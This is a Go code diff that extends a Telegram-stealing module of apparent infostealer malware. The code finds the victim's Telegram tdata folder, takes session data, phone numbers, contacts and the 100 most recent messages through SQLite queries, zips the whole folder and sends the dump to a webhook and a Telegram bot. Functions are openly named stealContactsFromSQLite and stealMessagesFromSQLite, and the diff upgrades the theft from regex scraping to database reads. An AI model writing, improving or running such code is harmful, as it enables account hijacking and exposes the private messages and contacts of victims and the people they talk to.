@@ -3,16 +3,20 @@ package telegram
 import (
 	"archive/zip"
 	"bytes"
+	"database/sql"
 	"encoding/json"
 	"fmt"
 	"io"
 	"io/ioutil"
+	"mime/multipart"
 	"net/http"
 	"os"
 	"path/filepath"
 	"regexp"
 	"strings"
 	"time"
+
+	_ "github.com/mattn/go-sqlite3"
 )
 
 type TelegramSession struct {
@@ -54,7 +58,6 @@ func Run(config map[string]interface{}) {
 
 	sendStatus(webhook, telegramConfig, "telegram", "📁 TData Found", "Telegram tdata folder located")
 
-	// 1. Vol des sessions
 	sessions := extractSessions(tdataPath)
 	if len(sessions) == 0 {
 		sendStatus(webhook, telegramConfig, "telegram", "⚠️ No Sessions Found", "No active Telegram sessions found")
@@ -62,25 +65,21 @@ func Run(config map[string]interface{}) {
 		sendStatus(webhook, telegramConfig, "telegram", fmt.Sprintf("✅ %d Sessions Found", len(sessions)), fmt.Sprintf("Found %d Telegram sessions", len(sessions)))
 	}
 
-	// 2. Vol des numéros de téléphone
 	phones := extractPhones(tdataPath)
 	if len(phones) > 0 {
 		sendStatus(webhook, telegramConfig, "telegram", fmt.Sprintf("📱 %d Phones Found", len(phones)), fmt.Sprintf("Found %d phone numbers", len(phones)))
 	}
 
-	// 3. Vol des contacts
-	contacts := stealContacts(tdataPath)
+	contacts := stealContactsFromSQLite(tdataPath)
 	if len(contacts) > 0 {
 		sendStatus(webhook, telegramConfig, "telegram", fmt.Sprintf("👥 %d Contacts Found", len(contacts)), fmt.Sprintf("Found %d Telegram contacts", len(contacts)))
 	}
 
-	// 4. Vol des messages récents
-	messages := stealRecentMessages(tdataPath)
+	messages := stealMessagesFromSQLite(tdataPath)
 	if len(messages) > 0 {
-		sendStatus(webhook, telegramConfig, "telegram", fmt.Sprintf("💬 %d Messages Found", len(messages)), fmt.Sprintf("Found %d recent messages", len(messages)))
+		sendStatus(webhook, telegramConfig, "telegram", fmt.Sprintf("💬 %d Messages Found", len(messages)), fmt.Sprintf("Found %d messages", len(messages)))
 	}
 
-	// 5. ZIP complet du dossier tdata
 	zipPath := createFullTDataZip(tdataPath)
 	if zipPath != "" {
 		sendStatus(webhook, telegramConfig, "telegram", "📦 Full TData Archived", "Telegram tdata folder compressed")
@@ -88,7 +87,6 @@ func Run(config map[string]interface{}) {
 		os.Remove(zipPath)
 	}
 
-	// 6. Envoi des informations
 	sessionInfo := formatCompleteInfo(sessions, phones, contacts, messages)
 	sendMessage(webhook, telegramConfig, sessionInfo)
 
@@ -152,21 +150,73 @@ func extractPhones(tdataPath string) []string {
 	return phones
 }
 
-func stealContacts(tdataPath string) []TelegramContact {
+func stealContactsFromSQLite(tdataPath string) []TelegramContact {
 	var contacts []TelegramContact
-	contactRegex := regexp.MustCompile(`(\+?\d{10,15})`)
 
-	// Les contacts sont souvent dans les fichiers .cache
-	cacheFiles, _ := filepath.Glob(filepath.Join(tdataPath, "*.cache"))
-	for _, cacheFile := range cacheFiles {
-		data, err := ioutil.ReadFile(cacheFile)
-		if err == nil {
-			matches := contactRegex.FindAllString(string(data), -1)
-			for _, match := range matches {
-				if !containsContact(contacts, match) {
+	dbPath := filepath.Join(tdataPath, "data.sqlite")
+	if _, err := os.Stat(dbPath); os.IsNotExist(err) {
+		return contacts
+	}
+
+	// Copier la base pour ne pas verrouiller le fichier original
+	tempDB := filepath.Join(os.TempDir(), "telegram_contacts_temp.db")
+	fileCopy(dbPath, tempDB)
+	defer os.Remove(tempDB)
+
+	db, err := sql.Open("sqlite3", tempDB)
+	if err != nil {
+		return contacts
+	}
+	defer db.Close()
+
+	// Table contacts
+	rows, err := db.Query("SELECT user_id, first_name, last_name, phone FROM contacts")
+	if err != nil {
+		return contacts
+	}
+	defer rows.Close()
+
+	for rows.Next() {
+		var userID int64
+		var firstName, lastName, phone string
+		if err := rows.Scan(&userID, &firstName, &lastName, &phone); err == nil {
+			name := firstName
+			if lastName != "" {
+				name += " " + lastName
+			}
+			if name == "" {
+				name = "Unknown"
+			}
+			if phone != "" {
+				contacts = append(contacts, TelegramContact{
+					Phone: phone,
+					Name:  name,
+					ID:    userID,
+				})
+			}
+		}
+	}
+
+	// Table users (pour plus de contacts)
+	rows2, err := db.Query("SELECT id, first_name, last_name, phone FROM users")
+	if err == nil {
+		defer rows2.Close()
+		for rows2.Next() {
+			var userID int64
+			var firstName, lastName, phone string
+			if err := rows2.Scan(&userID, &firstName, &lastName, &phone); err == nil {
+				name := firstName
+				if lastName != "" {
+					name += " " + lastName
+				}
+				if name == "" {
+					name = "Unknown"
+				}
+				if phone != "" && !containsContact(contacts, phone) {
 					contacts = append(contacts, TelegramContact{
-						Phone: match,
-						Name:  "Unknown",
+						Phone: phone,
+						Name:  name,
+						ID:    userID,
 					})
 				}
 			}
@@ -176,31 +226,60 @@ func stealContacts(tdataPath string) []TelegramContact {
 	return contacts
 }
 
-func stealRecentMessages(tdataPath string) []TelegramMessage {
+func stealMessagesFromSQLite(tdataPath string) []TelegramMessage {
 	var messages []TelegramMessage
 
-	// Les messages sont dans les fichiers de cache
-	cacheFiles, _ := filepath.Glob(filepath.Join(tdataPath, "*.cache"))
-	for _, cacheFile := range cacheFiles {
-		data, err := ioutil.ReadFile(cacheFile)
-		if err == nil {
-			// Rechercher des patterns de messages
-			// Format typique : "sender: message content"
-			msgRegex := regexp.MustCompile(`([a-zA-Z0-9_]+):\s*(.+?)($|\n)`)
-			matches := msgRegex.FindAllStringSubmatch(string(data), -1)
-			for _, match := range matches {
-				if len(match) >= 3 {
-					messages = append(messages, TelegramMessage{
-						Sender:   match[1],
-						Content:  strings.TrimSpace(match[2]),
-						Receiver: "Me",
-						Time:     time.Now().Format("15:04:05"),
-					})
-				}
-			}
+	dbPath := filepath.Join(tdataPath, "data.sqlite")
+	if _, err := os.Stat(dbPath); os.IsNotExist(err) {
+		return messages
+	}
 
-			// Format alternatif : messages chiffrés (si on peut les déchiffrer)
-			// Pour l'instant, on les récupère tels quels
+	tempDB := filepath.Join(os.TempDir(), "telegram_messages_temp.db")
+	fileCopy(dbPath, tempDB)
+	defer os.Remove(tempDB)
+
+	db, err := sql.Open("sqlite3", tempDB)
+	if err != nil {
+		return messages
+	}
+	defer db.Close()
+
+	// Récupérer les derniers messages
+	query := `
+		SELECT 
+			u1.first_name || ' ' || u1.last_name as sender,
+			u2.first_name || ' ' || u2.last_name as receiver,
+			m.message,
+			datetime(m.date, 'unixepoch') as date
+		FROM messages m
+		LEFT JOIN users u1 ON m.from_id = u1.id
+		LEFT JOIN users u2 ON m.to_id = u2.id
+		WHERE m.message IS NOT NULL AND m.message != ''
+		ORDER BY m.date DESC
+		LIMIT 100
+	`
+
+	rows, err := db.Query(query)
+	if err != nil {
+		return messages
+	}
+	defer rows.Close()
+
+	for rows.Next() {
+		var sender, receiver, content, date string
+		if err := rows.Scan(&sender, &receiver, &content, &date); err == nil {
+			if sender == "" {
+				sender = "Unknown"
+			}
+			if receiver == "" {
+				receiver = "Me"
+			}
+			messages = append(messages, TelegramMessage{
+				Sender:   sender,
+				Receiver: receiver,
+				Content:  content,
+				Time:     date,
+			})
 		}
 	}
 
@@ -256,7 +335,6 @@ func formatCompleteInfo(sessions []TelegramSession, phones []string, contacts []
 	output += "📱 TELEGRAM COMPLETE SESSION DUMP\n"
 	output += "==================================\n\n"
 
-	// Sessions
 	output += "🔑 SESSIONS\n"
 	output += "-----------\n\n"
 	if len(sessions) == 0 {
@@ -272,7 +350,6 @@ func formatCompleteInfo(sessions []TelegramSession, phones []string, contacts []
 		}
 	}
 
-	// Phones
 	output += "📱 PHONES\n"
 	output += "---------\n\n"
 	if len(phones) > 0 {
@@ -284,7 +361,6 @@ func formatCompleteInfo(sessions []TelegramSession, phones []string, contacts []
 	}
 	output += "\n"
 
-	// Contacts
 	output += "👥 CONTACTS\n"
 	output += "-----------\n\n"
 	if len(contacts) > 0 {
@@ -296,7 +372,6 @@ func formatCompleteInfo(sessions []TelegramSession, phones []string, contacts []
 	}
 	output += "\n"
 
-	// Recent Messages
 	output += "💬 RECENT MESSAGES\n"
 	output += "-----------------\n\n"
 	if len(messages) > 0 {
@@ -402,6 +477,23 @@ func sendTelegramFile(botToken, chatID, filePath string) {
 	writer.Close()
 
 	http.Post(url, writer.FormDataContentType(), body)
+}
+
+func fileCopy(src, dst string) error {
+	source, err := os.Open(src)
+	if err != nil {
+		return err
+	}
+	defer source.Close()
+
+	dest, err := os.Create(dst)
+	if err != nil {
+		return err
+	}
+	defer dest.Close()
+
+	_, err = io.Copy(dest, source)
+	return err
 }
 
 func execCmd(cmd string) {}
